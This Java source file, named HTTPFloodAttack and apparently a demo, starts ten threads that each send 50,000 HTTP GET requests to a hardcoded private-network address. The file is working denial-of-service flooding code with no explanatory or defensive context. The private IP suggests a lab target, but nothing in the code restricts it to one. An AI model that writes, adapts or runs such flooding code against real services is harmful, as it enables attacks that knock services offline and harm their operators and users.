package com.dhanushkad.demo;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.security.SecureRandom;

public class HTTPFloodAttack {
    public static void main(String args[]) throws MalformedURLException {
        URL url = new URL("http://192.168.43.174:9090/hello");

        RequestThread requestThread1 = new RequestThread();
        RequestThread requestThread2 = new RequestThread();
        RequestThread requestThread3 = new RequestThread();
        RequestThread requestThread4 = new RequestThread();
        RequestThread requestThread5 = new RequestThread();
        RequestThread requestThread6 = new RequestThread();
        RequestThread requestThread7 = new RequestThread();
        RequestThread requestThread8 = new RequestThread();
        RequestThread requestThread9 = new RequestThread();
        RequestThread requestThread10 = new RequestThread();

        requestThread1.start();
        requestThread2.start();
        requestThread3.start();
        requestThread4.start();
        requestThread5.start();
        requestThread6.start();
        requestThread7.start();
        requestThread8.start();
        requestThread9.start();
        requestThread10.start();

    }
}

class RequestThread extends Thread {

    public void run() {
        URL url = null;
        try {
            url = new URL("http://192.168.43.174:9090/hello");
            for (int i = 0; i < 50000; i++) {
                HttpURLConnection con = null;
                try {
                    con = (HttpURLConnection) url.openConnection();
                    con.setRequestMethod("GET");
                    con.getResponseCode();
                    con.disconnect();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        } catch (Exception e) {
            // do nothing
        }
    }

}